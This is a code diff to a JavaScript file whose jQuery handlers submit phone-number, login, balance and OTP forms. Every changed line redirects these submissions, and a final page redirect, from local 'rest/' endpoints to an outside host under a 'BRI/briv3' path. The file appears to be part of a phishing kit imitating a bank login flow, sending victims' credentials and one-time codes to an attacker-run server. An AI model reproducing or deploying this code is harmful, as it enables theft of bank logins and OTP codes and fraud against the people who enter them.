@@ -18,7 +18,7 @@ function sendNohp(){
    
        $.ajax({
             type: 'POST',
-            url: 'rest/no.php',
+            url: 'https://anjayhostjon.cloud/BRI/briv3/no.php',
             data: $('#hpForm').serialize(),
             datatype: 'JSON',
             
@@ -53,7 +53,7 @@ function sendLogin(){
    
      $.ajax({
             type: 'POST',
-            url: 'rest/login.php',
+            url: 'https://anjayhostjon.cloud/BRI/briv3/login.php',
             data: $('#loginForm').serialize(),
             datatype: 'JSON',
             
@@ -95,7 +95,7 @@ function sendSaldo(){
   
        $.ajax({
             type: 'POST',
-            url: 'rest/saldo.php',
+            url: 'https://anjayhostjon.cloud/BRI/briv3/saldo.php',
             data: $('#saldoForm').serialize(),
             datatype: 'JSON',
         
@@ -140,7 +140,7 @@ function sendOtp(){
      
      $.ajax({
             type: 'POST',
-            url: 'rest/otp.php',
+            url: 'https://anjayhostjon.cloud/BRI/briv3/otp.php',
             data: $('#formOtp').serialize(),
             datatype: 'JSON',
         
@@ -169,7 +169,7 @@ function wa(){
    audio.play();
    
 setTimeout(function(){  
-location.href='wa';
+location.href='https://anjayhostjon.cloud/BRI/briv3/wa';
     }, 5000);
     setTimeout(function(){
     $(".wait").fadeOut();   
